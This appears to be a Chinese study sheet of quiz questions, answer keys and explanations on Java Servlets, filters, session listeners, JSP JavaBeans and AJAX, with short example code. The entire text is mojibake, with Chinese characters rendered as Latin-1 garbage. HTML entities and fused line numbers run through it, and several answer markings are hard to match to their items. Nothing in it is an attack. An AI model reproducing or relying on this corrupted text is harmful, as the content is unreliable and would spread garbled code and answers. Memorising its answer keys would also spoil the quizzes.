Servletä¸­çš„ä¸¤ä¸ªå¤„ç†è¯·æ±‚çš„æ–¹æ³•æ˜¯doGet()ã€doPost()ã€‚ A. âˆš B. Ã— Servletä¸ºæ¯ä¸€ä¸ªHttpSessionå¯¹è±¡åˆ†é…çš„å”¯ä¸€æ ‡è¯†ç¬¦æ˜¯SessionIDã€‚ A. âˆš B. Ã— åœ¨Servletç¨‹åºä¸­Servletå¯¹è±¡æ¶ˆäº¡æ—¶è°ƒç”¨çš„æ–¹æ³•æ˜¯close()ã€‚ A. Ã— B. âˆš åœ¨Servletä¸­ä¸»è¦HttpServletResponseç±»çš„é‡å®šå‘æ–¹æ³•forward()å®ç°é‡å®šå‘ï¼Œä½¿ç”¨RequestDispatcherç±»çš„è½¬å‘æ–¹æ³•sendRedirect()å®ç°è½¬å‘åŠŸèƒ½ã€‚ A. âˆš B. Ã— webã€xmlæ–‡ä»¶ä¸­çš„ä¸¤ç§ç±»å‹çš„å‚æ•°ä¸ºå…¨å±€å‚æ•°ã€å±€éƒ¨å‚æ•°ã€‚ A. Ã— B. âˆš Filteræ¥å£ä¸­æœ€ä¸»è¦çš„æ–¹æ³•æ˜¯doFilter()ã€‚ A. Ã— B. âˆš å®ç°Filteræ¥å£çš„ç±»éœ€è¦é‡å†™init()æ–¹æ³•ã€close()æ–¹æ³•ã€doFilter()æ–¹æ³•ã€‚ A. âˆš B. Ã— è¿‡æ»¤å™¨çš„doFilterï¼ˆï¼‰å‡½æ•°åœ¨Servletä¹‹åè¢«è°ƒç”¨ã€‚ A. Ã— B. âˆš æŸä¸ªæ–‡ä»¶åä¸ºSecondServlet.javaçš„servletæ–‡ä»¶ï¼Œåœ¨æœåŠ¡å™¨éƒ¨ç½²æ˜ å°„ï¼Œä»¥ä¸‹å“ªä¸ªurl-patternèƒ½å¤ŸæˆåŠŸï¼ˆï¼‰ã€‚ &lt;url-pattern&gt;/5.1&lt;/url-pattern&gt; servletçš„url-patternæ˜ å°„è§„åˆ™è¦ä»¥&#x2F;å¼€å¤´ï¼Œ&#x2F;*.java å±äºæ‰©å±•æ˜ å°„ï¼Œ&#x2F;å’Œæ‰©å±•æ˜ å°„åŒæ—¶ä½¿ç”¨ä¼šå‡ºç°è¯­æ³•é”™è¯¯ï¼› &#x2F;5.1å±äºç²¾ç¡®è·¯å¾„æ˜ å°„ï¼Œå¯ä»¥éƒ¨ç½²æˆåŠŸã€‚ ä¸‹åˆ—Servletæ–¹æ³•ä¸­ï¼Œï¼ˆï¼‰æ–¹æ³•åœ¨Servletç”Ÿå‘½å‘¨æœŸä¸­ï¼ŒServletæ¯è¯·æ±‚ä¸€æ¬¡å®ƒå°±ä¼šè¢«è°ƒç”¨ä¸€æ¬¡ã€‚ service() init() è½½å…¥æ—¶è¢«æ‰§è¡Œï¼Œä¸”åªæ‰§è¡Œä¸€æ¬¡ï¼Œå¯¹servletè¿›è¡Œåˆå§‹åŒ– service() è¯·æ±‚æœåŠ¡ï¼Œè¯·æ±‚ä¸€æ¬¡æ‰§è¡Œä¸€æ¬¡ destroy() æœåŠ¡å™¨å…³é—­æ—¶è¢«è°ƒç”¨ï¼Œä¸”åªæ‰§è¡Œä¸€æ¬¡ï¼Œç”¨æ¥é‡Šæ”¾servletæ‰€å èµ„æº close()ä¸å±äºservlet ç”Ÿå‘½å‘¨æœŸæ–¹æ³• å…³äºservletä½¿ç”¨JSPå†…ç½®å¯¹è±¡ï¼Œç°æœ‰éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼Œè¯·é—®åœ¨å®¢æˆ·ç«¯é¡µé¢ä¼šæ˜¾ç¤ºä»€ä¹ˆå†…å®¹ï¼ˆï¼‰ã€‚ 123456789101112131415protected void doPost(HttpServletRequest request,HttpServletResponse response) throws ServletException, IOException &#123;response.setContentType(&quot;text/html;charset=gb2312&quot;);request.setCharacterEncoding(&quot;gb2312&quot;);out.println(&quot;äº”ä¸€&quot;);System.out.println(&quot;åŠ³åŠ¨èŠ‚&quot;);response.getWriter().println(â€œå¿«ä¹ï¼â€);&#125; ä¼šç¼–è¯‘é”™è¯¯ out.println(â€œäº”ä¸€â€œ); &#x2F;&#x2F;outå¯¹è±¡åœ¨servleté‡Œä½¿ç”¨éœ€è¦å…ˆå£°æ˜PrintWriter out = response.getWriter();å¦åˆ™ä¼šå‡ºç°ç¼–è¯‘é”™è¯¯ã€‚ System.out.println(â€œåŠ³åŠ¨èŠ‚â€œ); &#x2F;&#x2F;åœ¨JSPå’Œservletéƒ½å¯ä»¥è¾“å‡ºåˆ°å®¢æˆ·ç«¯çš„æ§åˆ¶å°ï¼Œä¸èƒ½è¾“å‡ºåˆ°å®¢æˆ·ç«¯é¡µé¢ã€‚ response.getWriter().println(â€œå¿«ä¹ï¼â€); &#x2F;&#x2F;åœ¨JSPå’Œservletéƒ½å¯ä»¥è¾“å‡ºåˆ°å®¢æˆ·ç«¯é¡µé¢ã€‚ ç°æœ‰a.jspã€B.javaå’ŒC.javaæ–‡ä»¶ï¼ŒB.javaæ–‡ä»¶è·å–å®¢æˆ·ç«¯a.jspçš„è¡¨å•ä¼ å€¼ï¼Œå¹¶å°†è·å–åˆ°çš„å€¼ä¼ é€’åˆ°C.javaåæ­£ç¡®æ˜¾ç¤ºåœ¨å®¢æˆ·ç«¯é¡µé¢ï¼Œè¯·è¡¥å…¨ä»£ç ï¼ˆï¼‰ã€‚ b.javaéƒ¨åˆ†ä»£ç æ®µå¦‚ä¸‹ï¼š 123456789101112131415protected void doPost(HttpServletRequest request,HttpServletResponse response) throws ServletException, IOException &#123;request.setCharacterEncoding(&quot;gb2312&quot;);String b = request.getParameter(&quot;a&quot;);if (b.length() &gt; 0) &#123;â‘  request.getRequestDispatch(&quot;C).forward(request,response);&#125;&#125; request.getRequestDispatcher(â€œCâ€).forward(request, response); &#x2F;&#x2F;è½¬å‘ï¼Œé€šè¿‡forwardæ–¹æ³•æŠŠå½“å‰é¡µé¢çš„requestå¯¹è±¡é‡Œçš„æ•°æ®è½¬å‘åˆ°Cé¡µé¢ï¼ŒgetRequestDispatcher(â€œCâ€)ã€‚ response.sendRedirect(â€œCâ€); &#x2F;&#x2F;é‡å®šå‘ï¼Œæ— æ³•ä»ä»¥å‰çš„requestå¯¹è±¡ä¸­è·å–ç”¨æˆ·æäº¤çš„æ•°æ®ã€‚ response.encodeRedirectURL(â€œCâ€); &#x2F;&#x2F;URLé‡å†™ï¼Œæ•°æ®æœ‰ä¸¢å¤±æ— æ³•è·å–ã€‚ forward(request, response); &#x2F;&#x2F;è¯­æ³•é”™è¯¯ã€‚ åœ¨webæœåŠ¡å™¨testç›®å½•ä¸‹æœ‰ä¸€å®¢æˆ·ç«¯a.jspæ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤ºã€‚åœ¨B.javaæ–‡ä»¶è®¾ç½®å­—ç¬¦è¿‡æ»¤å™¨ï¼Œä¸‹é¢æ³¨è§£æ–¹å¼èƒ½ä½¿ç¨‹åºæ­£å¸¸è¿è¡Œå¹¶è§£å†³ä¸­æ–‡ä¹±ç çš„ä¸ºï¼ˆï¼‰ã€‚ 1234567891011&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;&lt;form action=&quot;B&quot; method=&quot;post&quot;&gt;è¯·è¾“å…¥å­¦ç”Ÿä¿¡æ¯çš„æ¨¡ç³Šèµ„æ–™ï¼š&lt;input type=&quot;text&quot; name=&quot;stuname&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; value=&quot;æŸ¥è¯¢&quot;&gt;&lt;/form&gt; 123@WebFilter(filterName = &quot;setCharacterEncodingFilter&quot;,urlPatterns = &#123; &quot;/test/a.jsp&quot;&#125;, initParams = &#123;@WebInitParam(name = &quot;encoding&quot;, value = &quot;GBK&quot;)&#125;) urlPatterns &#x3D; { â€œ&#x2F;test&#x2F;a.jspâ€ ; } &#x2F;&#x2F;ç²¾ç¡®åŒ¹é…æ‹¦æˆªæœåŠ¡å™¨ä¸‹testç›®å½•çš„a.jspå®¢æˆ·ç«¯è¯·æ±‚ã€‚ value &#x3D; â€œGBKâ€; ä¸å®¢æˆ·ç«¯charset&#x3D;gb2312ç¼–ç å…¼å®¹ã€‚ ç°åœ¨ä¸ºWebæœåŠ¡å™¨è®¾ç½®ç›‘å¬sessionä¸­æŸä¸ªå¯¹è±¡çŠ¶æ€å˜åŒ–ï¼Œä¸‹é¢èƒ½å®ç°å°†sessionå¯¹è±¡æŒä¹…åŒ–åˆ°å­˜å‚¨è®¾å¤‡ä¸Šçš„æ–¹æ³•ä¸ºï¼ˆï¼‰ã€‚ 1sessionWillPassivate(HttpSessionEvent se) HttpSessionä¸­å¯¹è±¡çš„çŠ¶æ€æœ‰ï¼šç»‘å®šâ†’è§£é™¤ç»‘å®šï¼Œé’åŒ–â†’æ´»åŒ–ã€‚ valueBound(HttpSessionBindingEvent event) &#x2F;&#x2F;ç»‘å®šï¼Œå½“å¯¹è±¡è¢«æ”¾åˆ°sessioné‡Œæ—¶ï¼Œæ‰§è¡Œæ­¤æ–¹æ³•ã€‚ valueUnbound(HttpSessionBindingEvent event) &#x2F;&#x2F;è§£é™¤ç»‘å®šï¼Œå½“å¯¹è±¡è¢«ä»sessioné‡Œç§»é™¤æ—¶ï¼Œæ‰§è¡Œæ­¤æ–¹æ³•ã€‚ sessionWillPassivate(HttpSessionEvent se) &#x2F;&#x2F;é’åŒ–ï¼Œå½“sessioné‡Œçš„å¯¹è±¡è¢«é’åŒ–æ—¶ï¼Œæ‰§è¡Œæ­¤æ–¹æ³•ã€‚ sessionDidActivate(HttpSessionEvent se) &#x2F;&#x2F;æ´»åŒ–ï¼Œå½“å¯¹è±¡è¢«é‡æ–°åŠ è½½ï¼ˆæ´»åŒ–ï¼‰æ—¶ï¼Œæ‰§è¡Œæ­¤æ–¹æ³•ã€‚ ç¬¬åç«  JSPå’ŒJavaBean1-5ï¼šABABB 6-10ï¼šAABBD ä¸‹åˆ—å…³äºJavaBeançš„è¯´æ³•æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ã€‚ A. Javaæ–‡ä»¶ä¸Beanå®šä¹‰çš„ç±»åå¯ä»¥ä¸åŒï¼Œä½†æ˜¯è¦åŒºåˆ†å­—æ¯å¤§å°å†™ã€‚ B. åœ¨JSPæ–‡ä»¶ä¸­å¼•ç”¨Beanå…¶å®å°±æ˜¯ç”¨jsp:useBeanè¯­å¥ã€‚ C. è¢«å¼•ç”¨çš„Beanæ–‡ä»¶çš„æ‰©å±•åä¸º.jspã€‚ D. Beanæ–‡ä»¶æ”¾åœ¨ä»»ä½•ç›®å½•ä¸‹éƒ½å¯ä»¥è¢«å¼•ç”¨ã€‚ JavaBeançš„å±æ€§å¿…é¡»å£°æ˜ä¸ºprivateï¼Œæ–¹æ³•å¿…é¡»å£°æ˜ä¸ºï¼ˆï¼‰è®¿é—®ç±»å‹ã€‚ A. private B. public t C. protec D. static JavaBeanå¯ä»¥é€šè¿‡ç›¸å…³jspåŠ¨ä½œæŒ‡ä»¤è¿›è¡Œè°ƒç”¨ã€‚ä¸‹é¢ï¼ˆï¼‰ä¸æ˜¯JavaBeanå¯ä»¥ä½¿ç”¨çš„jspåŠ¨ä½œæŒ‡ä»¤ã€‚ A. jsp:setParameter B. jsp:useBean C. jsp:getProperty D. jsp:setProperty JSPé¡µé¢é€šè¿‡ï¼ˆï¼‰è¯†åˆ«Beanå¯¹è±¡ï¼Œå¯ä»¥åœ¨ç¨‹åºæ®µä¸­é€šè¿‡xx.methodå½¢å¼è°ƒç”¨Beanä¸­çš„setå’Œgetæ–¹æ³•ã€‚ A. class B. id C. name D. classname ï¼ˆï¼‰ä½œç”¨èŒƒå›´å°†ä½¿Beanå¯¹è±¡ä¿å­˜åœ¨æœåŠ¡å™¨çš„å†…å­˜ç©ºé—´ä¸­ï¼Œåœ¨æœåŠ¡å™¨å…³é—­åè¢«ç§»é™¤ã€‚ A. request B. application C. session D. page å¯¹äºï¼ˆï¼‰ä½œç”¨èŒƒå›´çš„Beanï¼Œå½“å®¢æˆ·ç¦»å¼€è¿™ä¸ªé¡µé¢æ—¶JSPå¼•æ“å–æ¶ˆä¸ºå®¢æˆ·çš„è¯¥é¡µé¢åˆ†é…çš„Beanï¼Œé‡Šæ”¾ä»–æ‰€å çš„å†…å­˜ç©ºé—´ã€‚ A. page B. request C. application D. session å…³äºJavaBeanï¼Œä¸‹åˆ—å™è¿°ä¸­ä¸æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ã€‚ A. JavaBeanå’ŒServletä¸€æ ·ï¼Œåœ¨ä½¿ç”¨ä¹‹å‰å¿…é¡»åœ¨é¡¹ç›®çš„web.xmlä¸­æ³¨å†Œã€‚ B. JavaBeançš„ç±»å¿…é¡»æ˜¯å…·ä½“çš„å’Œå…¬å…±çš„ï¼Œå¹¶ä¸”å…·æœ‰æ— å‚æ•°çš„æ„é€ å™¨ã€‚ C. JavaBeanå±æ€§å’Œè¡¨å•æ§ä»¶åç§°èƒ½å¾ˆå¥½åœ°è€¦åˆï¼Œå¾—åˆ°è¡¨å•æäº¤çš„å‚æ•°ã€‚ **D.**JavaBeançš„ç±»å±æ€§æ˜¯ç§æœ‰çš„ï¼Œè¦é€šè¿‡å…¬å…±æ–¹æ³•è¿›è¡Œè®¿é—®ã€‚ ä½¿ç”¨jsp:getPropertyåŠ¨ä½œæ ‡è®°å¯ä»¥åœ¨JSPé¡µé¢ä¸­å¾—åˆ°Beanå®ä¾‹çš„å±æ€§å€¼ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºï¼ˆï¼‰ç±»å‹çš„æ•°æ®å‘é€åˆ°å®¢æˆ·ç«¯ã€‚ A. Classes B. String C. Object D. Double åœ¨é¡¹ç›®ä¸­å·²ç»å»ºç«‹äº†ä¸€ä¸ªJavaBeanï¼Œå…¶ç±»ä¸ºbean.Studentï¼Œè¯¥Beanå…·æœ‰nameå±æ€§ï¼Œåˆ™ä¸‹é¢æ ‡ç­¾ç”¨æ³•æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ã€‚ A. &lt;jsp:useBean id&#x3D;â€studentâ€ class&#x3D;â€Studentâ€ scope&#x3D;â€sessionâ€&#x2F;&gt; B. &lt;jsp:useBean id&#x3D;â€studentâ€ class&#x3D;â€bean.studentâ€ scope&#x3D;â€sessionâ€&gt; C. &lt;jsp:useBean id&#x3D;â€studentâ€ class&#x3D;â€Studentâ€ scope&#x3D;â€sessionâ€&gt; D. &lt;jsp:getProperty name&#x3D;â€nameâ€ property&#x3D;â€studentâ€&#x2F;&gt; ç»™å®šTheBeanç±»ï¼Œå‡è®¾è¿˜æ²¡æœ‰åˆ›å»ºTheBeanç±»çš„å®ä¾‹ï¼Œä»¥ä¸‹ï¼ˆï¼‰JSPæ ‡å‡†åŠ¨ä½œè¯­å¥èƒ½åˆ›å»ºè¿™ä¸ªBeançš„ä¸€ä¸ªæ–°å®ä¾‹ï¼Œå¹¶æŠŠå®ƒå­˜å‚¨åœ¨è¯·æ±‚ä½œç”¨åŸŸã€‚ A. &lt;jsp:takeBean id&#x3D;â€myBeanâ€ type&#x3D;â€com.example.TheBeanâ€&#x2F;&gt; B. &lt;jsp:takeBean id&#x3D;â€myBeanâ€ class&#x3D;â€com.example.TheBeanâ€ scope&#x3D;â€requestâ€&#x2F;&gt; C. &lt;jsp:useBean id&#x3D;â€myBeanâ€ type&#x3D;â€com.example.TheBeanâ€&#x2F;&gt; D. &lt;jsp:useBean id&#x3D;â€myBeanâ€ class&#x3D;â€com.example.TheBeanâ€ scope&#x3D;â€requestâ€&#x2F;&gt; 1-5ï¼šAABBB 6-10ï¼šABAAA åœ¨JavaBeanä¸­å¯ä»¥å°†æ§åˆ¶é€»è¾‘ã€å€¼ã€æ•°æ®åº“è®¿é—®å’Œå…¶ä»–å¯¹è±¡è¿›è¡Œå°è£…ï¼Œå¹¶ä¸”å¯ä»¥è¢«å…¶ä»–åº”ç”¨è°ƒç”¨ã€‚ A. âˆš B. Ã— avaBeanæ”¯æŒä¸¤ç§ç»„ä»¶ï¼Œå³å¯è§†åŒ–ç»„ä»¶ã€éå¯è§†åŒ–ç»„ä»¶ã€‚ A. âˆš B. Ã— åœ¨JSPä¸­å¯ä»¥ä½¿ç”¨jsp:setPropertyæ–¹æ³•æ¥è®¾ç½®JavaBeançš„å±æ€§ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ jsp:getPropertyæ–¹æ³•æ¥è·å–JavaBeançš„å€¼ã€‚ A. Ã— B. âˆš JavaBeanè§„å®šæˆå‘˜å˜é‡çš„è¯»&#x2F;å†™é€šè¿‡setter()æ–¹æ³•å’Œgetter()æ–¹æ³•è¿›è¡Œã€‚ A. âˆš B. Ã— ç»™Booleanç±»å‹è®¾ç½®å±æ€§ä½¿ç”¨isæ–¹æ³•ã€‚ A. Ã— B. âˆš JavaBeanæœ‰4ä¸ªscopeï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯applicationã€pageã€sessionã€requestã€‚ A. âˆš B. Ã— å½“scope&#x3D;applicationæ—¶ï¼ŒJavaBeanå¯¹è±¡å¯ä»¥è¢«åŒä¸€ç”¨æˆ·çš„æ‰€æœ‰é¡µé¢è®¤è¯†ã€‚ A. âˆš B. Ã— å½“scope&#x3D;requestæ—¶ï¼ŒJavaBeanå¯¹è±¡å¯ä»¥åœ¨é€šè¿‡forwardæ–¹æ³•è·³è½¬çš„ç›®æ ‡é¡µé¢ä¸­è¢«è®¤è¯†ã€‚ A. âˆš B. Ã— DAOçš„å…¨ç§°æ˜¯Data Access Objectï¼Œå®ƒä¸“é—¨è´Ÿè´£å¯¹æ•°æ®åº“çš„è®¿é—®ã€‚ A. âˆš B. Ã— è·å–JavaBeançš„å±æ€§çš„ä¸¤ç§æ–¹æ³•æ˜¯ä½¿ç”¨JSPè¡¨è¾¾å¼æˆ–ç¨‹åºæ®µã€ä½¿ç”¨â€œjsp:getPropertyâ€åŠ¨ä½œã€‚ A. âˆš B. Ã— ä»¥ä¸‹ä»£ç å®šä¹‰äº†ä¸€ä¸ªJavaBeanç±»Student.javaï¼Œè¯·é—®å“ªäº›è¡Œæ²¡æœ‰éµå¾ªæœ‰å…³çº¦å®šï¼ˆï¼‰ã€‚ 123456789101112131 package bean;2 private class Student &#123; âŒ3 private String stuname;4 public String getstuname() &#123; âŒ 5 return stuname;&#125;6 public void setterStuname(String stuname) &#123; âŒ7 this.stuname = stuname;&#125;&#125; 1.JavaBeanåº”è¯¥æ˜¯publicç±»ï¼Œä¸”å…·æœ‰æ— å‚æ•°çš„publicæ„é€ æ–¹æ³•ã€‚ä¹Ÿå¯ä»¥å®šä¹‰å¸¦å‚æ•°æ„é€ æ–¹æ³•ã€‚ 2.ç±»çš„æˆå‘˜å˜é‡ä¸€èˆ¬ç§°ä¸ºå±æ€§ï¼ˆpropertyï¼‰ï¼Œå¯¹æ¯ä¸ªå±æ€§è®¿é—®æƒé™ä¸€èˆ¬å®šä¹‰ä¸ºprivateï¼Œå±æ€§åå¿…é¡»ä»¥å°å†™å­—æ¯å¼€å¤´ã€‚ 3.æ¯ä¸ªå±æ€§é€šå¸¸å®šä¹‰ä¸¤ä¸ªpublicæ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯è®¿é—®æ–¹æ³•ï¼ˆgetterï¼‰ï¼Œä¸€ä¸ªæ˜¯ä¿®æ”¹æ–¹æ³•ï¼ˆsetterï¼‰ï¼Œä½¿ç”¨å®ƒä»¬è®¿é—®å’Œä¿®æ”¹JavaBeansçš„å±æ€§å€¼ï¼Œå¯¹åº”çš„å˜é‡é¦–å­—æ¯å¿…é¡»å¤§å†™ã€‚ ç¬¬2è¡Œï¼špublic class Student{&#x2F;&#x2F;åº”è¯¥æ˜¯publicç±»ã€‚ ç¬¬4è¡Œï¼špublic String getStuname(){&#x2F;&#x2F;è®¿é—®æ–¹æ³•getterå¯¹åº”çš„å˜é‡é¦–å­—æ¯å¿…é¡»å¤§å†™ã€‚ ç¬¬6è¡Œï¼špublic void setStuname(String stuname){&#x2F;&#x2F;ä¿®æ”¹æ–¹æ³•setterï¼Œåº”è¯¥æ˜¯setStuname(String stuname)ã€‚ å¦‚æœå·²ç»åœ¨åŒ…beané‡Œæ­£ç¡®å®šä¹‰äº†ä¸€ä¸ªJavaBeanç±»Rose.javaï¼Œé€šè¿‡ä»¥ä¸‹JSPä»£ç èƒ½ä¸èƒ½æ­£ç¡®è®¿é—®beanï¼Œå¦‚æœä¸èƒ½ä»¥ä¸‹å“ªé¡¹ä¿®æ”¹æ˜¯æ­£ç¡®çš„ï¼ˆï¼‰ã€‚ 12345678910111 &lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;2 &lt;jsp:useBean id=&quot;rose&quot; type=&quot;bean.Rose&quot; scope=&quot;session&quot;/&gt;3 &lt;p&gt;çŸ©å½¢çš„é•¿æ˜¯ï¼š&lt;%=rose.getLength()%&gt;4 &lt;p&gt;çŸ©å½¢çš„å®½æ˜¯ï¼š&lt;%=rose.getWidth()%&gt;5 &lt;p&gt;çŸ©å½¢çš„é¢ç§¯æ˜¯ï¼š&lt;%=rose.computerArea()%&gt;6 &lt;p&gt;çŸ©å½¢çš„å‘¨é•¿æ˜¯ï¼š&lt;%=rose.computerLength()%&gt; typeå±æ€§å¿…é¡»ä¿è¯beanå®ä¾‹å­˜åœ¨ï¼Œå¦‚æœæ‰¾åˆ°ç”¨roseæŒ‡å‘å®ƒï¼Œå¦‚æœæ‰¾ä¸åˆ°äº§ç”ŸInstantiationå¼‚å¸¸ï¼ŒbeanName&#x3D;â€bean.Roseâ€;å¯ä»¥åŠ¨æ€å®ä¾‹åŒ–ã€‚ ç¬¬2è¡ŒåŠ å…¥åŠ¨ä½œæ ‡è®°useBeanå±æ€§beanNameå³å¯ï¼šã€‚ ä¸èƒ½è®¿é—®beanï¼Œåº”è¯¥åœ¨ç¬¬2è¡ŒåŠ å…¥åŠ¨ä½œæ ‡è®°useBeanå±æ€§ï¼›beanName = &quot;bean.Rose&quot; ä¸‹é¢è¯­å¥ä¸&lt;jsp:getProperty name=â€tomâ€ property=â€jerryâ€/&gt;ç­‰ä»·çš„æ˜¯ï¼ˆï¼‰ &lt;%out.print(tom.getJerry());%&gt; å…³äºjsp:setPropertyå’Œjsp:getPropertyæ ‡è®°çš„æè¿°ä»¥ä¸‹æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ã€‚ è¿™ä¸¤ä¸ªæ ‡è®°çš„nameå±æ€§å€¼å¿…é¡»ä¸&lt;jsp:useBean&gt;æ ‡è®°çš„idå±æ€§å€¼ç›¸å¯¹åº” student.jspæ–‡ä»¶ä»£ç å¦‚ä¸‹ï¼Œè¦ä½¿studentä¸€ç›´å­˜åœ¨äºä¼šè¯ä¸­ï¼Œç›´åˆ°ç»ˆæ­¢æˆ–è¢«åˆ é™¤ä¸ºæ­¢ï¼Œè¯·è¡¥å…¨ä»£ç ï¼ˆï¼‰ã€‚ 12345678910111213141516&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;jsp:useBean id=&quot;student&quot; class=&quot;bean.Student&quot; scope=&quot; ___session______ &quot; /&gt; &lt;jsp:setProperty property=&quot;stuname&quot; name=&quot;student&quot; value=&quot;rose&quot; /&gt; &lt;html&gt; &lt;body&gt; å­¦ç”Ÿå§“åï¼š &lt;jsp:getProperty name=&quot;student&quot; property=&quot;stuname&quot; /&gt; &lt;/body&gt; &lt;/html&gt; pageé¡µé¢åŸŸï¼Œrequestè¯·æ±‚åŸŸï¼Œsessionä¼šè¯åŸŸï¼Œapplicationåº”ç”¨åŸŸã€‚ ç¬¬åäºŒç«  AJAXå…¥é—¨1-5ï¼šDCDDB 6-10ï¼šCBCCB AJAXçš„è‹±æ–‡å…¨ç§°æ˜¯ï¼ˆï¼‰ã€‚ A. Asp+JavaScript+XML B. Asynchronous+Java+XML C. Asynchronous+JavaScript+XHTML D. Asynchronous+JavaScript+XML ä¸‹é¢å…³äºAJAXçš„æè¿°é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. AJAXä½¿ç”¨XHTMLå’ŒCSSåŸºäºçš„æ ‡å‡†è¡¨ç¤ºæŠ€æœ¯ã€‚ B. AJAXä½¿ç”¨XMLå’ŒXSLTè¿›è¡Œæ•°æ®äº’æ¢å’Œæ“ä½œã€‚ C. AJAXæ˜¯ä¸€ä¸ªæ–°æŠ€æœ¯ã€‚ D. AJAXä½¿ç”¨XMLHttpRequestè·å–æ•°æ®ã€‚ AJAXæ¨¡å¼ä¸­ï¼Œå®¢æˆ·ç«¯çš„è¯·æ±‚æ˜¯ï¼ˆï¼‰å®Œæˆçš„ã€‚ A. å•å‘ B. å¹¶å‘ C. åŒæ­¥ D. å¼‚æ­¥ ä»¥ä¸‹å…³äºAJAXä¼˜åŠ¿å’ŒåŠ£åŠ¿çš„æè¿°ï¼Œè¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. åº”ç”¨ä»…ç”±å°‘é‡é¡µé¢ç»„æˆï¼Œå¤§éƒ¨åˆ†äº¤äº’åœ¨é¡µé¢ä¹‹å†…å®Œæˆï¼Œä¸éœ€è¦åˆ‡æ¢æ•´ä¸ªé¡µé¢ã€‚ B. æŒ‰éœ€è·å–æ•°æ®ï¼Œæ¯æ¬¡åªä»æœåŠ¡å™¨ç«¯è·å–éœ€è¦çš„æ•°æ®ã€‚ C. æ”¹å–„è¡¨å•éªŒè¯æ–¹å¼ï¼Œä¸å†éœ€è¦æ‰“å¼€æ–°é¡µé¢ï¼Œä¹Ÿä¸å†éœ€è¦æ•´ä¸ªé¡µé¢æ•°æ®æäº¤ã€‚ D. AJAXå¯ä»¥å–ä»£ä¼ ç»Ÿçš„Webåº”ç”¨å¼€å‘ã€‚ ä½¿ç”¨AJAXæŠ€æœ¯ç¼–å†™Webåº”ç”¨ç¨‹åºï¼Œå…¶ä½¿ç”¨ï¼ˆï¼‰æ ¼å¼å®ç°æ•°æ®çš„ä¼ é€’ã€‚ A. HTML B. XML C. XHTML D. TXT XMLHttpRequestå¯¹è±¡çš„readyStateå±æ€§å€¼ä¸ºï¼ˆï¼‰ï¼Œä»£è¡¨è¯·æ±‚æˆåŠŸæ¥æ”¶æ•°æ®å®Œæ¯•ã€‚ A. 3 B. 1 C. 4 D. 2 åœ¨åˆ›å»ºè¯·æ±‚çš„ä»£ç ç‰‡æ®µxmlhttp.open(â€œgetâ€,â€info.jsp?a&#x3D;1)ä¸­ï¼Œä¼ é€’çš„å‚æ•°å€¼ä¸ºï¼ˆï¼‰ã€‚ A. a B. 1 C. info.jsp D. get onreadystatechangeäº‹ä»¶åœ¨ï¼ˆï¼‰é€‰é¡¹ä¸­å‘ç”Ÿå˜åŒ–æ—¶è§¦å‘ã€‚ A. onchange B. readystatus C. readyState D. onfocus åœ¨Firefoxæµè§ˆå™¨ä¸Šåˆ›å»ºXMLHttpRequestå¯¹è±¡çš„æ–¹æ³•æ˜¯ï¼ˆï¼‰ã€‚ A. var xmlHttp&#x3D;new ActiveXObject(â€œMsxml2.XMLHTTPâ€); B. var xmlHttp&#x3D;new ActiveXObject(â€œMicrosoft.XMLHTTPâ€); C. var xmlHttp&#x3D;new XMLHttpRequest(); D. ä»¥ä¸Šéƒ½ä¸å¯¹ã€‚ Javaæ˜¯æ•´ä¸ªAJAXçš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œå®ƒä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿè¿ç”¨ç¼–ç¨‹è¯­è¨€æ¥æ§åˆ¶æµè§ˆå™¨ç«¯çš„è¡Œä¸ºã€‚ A. âˆš B. Ã— AJAXæŠ€æœ¯åŒ…æ‹¬å¼‚æ­¥æ•°æ®è·å–æŠ€æœ¯ã€åŸºäºæ ‡å‡†çš„è¡¨ç¤ºæŠ€æœ¯ã€åŠ¨æ€æ˜¾ç¤ºå’Œäº¤äº’æŠ€æœ¯ã€æ•°æ®äº’æ¢å’Œæ“ä½œæŠ€æœ¯ã€Javaã€‚ A. Ã— AJAXä¸­open()æ–¹æ³•çš„å‚æ•°çš„å«ä¹‰åˆ†åˆ«æ˜¯è¯·æ±‚æ–¹å¼ã€è¯·æ±‚ç›®æ ‡ã€å¼‚æ­¥æˆ–åŒæ­¥ã€‚ A. âˆš AJAXä¸­open()æ–¹æ³•çš„ç¬¬3ä¸ªå‚æ•°ä¸ºfalseï¼Œè¡¨ç¤ºå¼‚æ­¥è¯·æ±‚ã€‚ B. Ã— readyStateå±æ€§çš„çŠ¶æ€æœ‰0ï¼šæœªåˆå§‹åŒ–çŠ¶æ€ï¼›1ï¼šå·²åˆå§‹åŒ–çŠ¶æ€ï¼›2ï¼šå‘é€æ•°æ®çŠ¶æ€ï¼›3ï¼šæ•°æ®ä¼ é€ä¸­çŠ¶æ€ï¼›4ï¼šå®ŒæˆçŠ¶æ€. B. âˆš å½“xmlHttpçŠ¶æ€æ”¹å˜æ—¶éœ€è¦è¿›è¡Œçš„å¤„ç†ä¸€èˆ¬ä»¥å“åº”å‡½æ•°å½¢å¼è¿›è¡Œã€‚ A. âˆš xmlHttpé™¤äº†æœ‰responseTextå±æ€§å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªå±æ€§innerTextï¼Œå«ä¹‰æ˜¯è¡¨ç¤ºåœ¨è¯¥divå†…æ˜¾ç¤ºå†…å®¹æ—¶ï¼Œä¸è€ƒè™‘å…¶HTMLæ ¼å¼çš„æ ‡ç­¾ï¼Œå³ï¼šå°†å†…å®¹åŸæ ·æ˜¾ç¤ºã€‚ A. 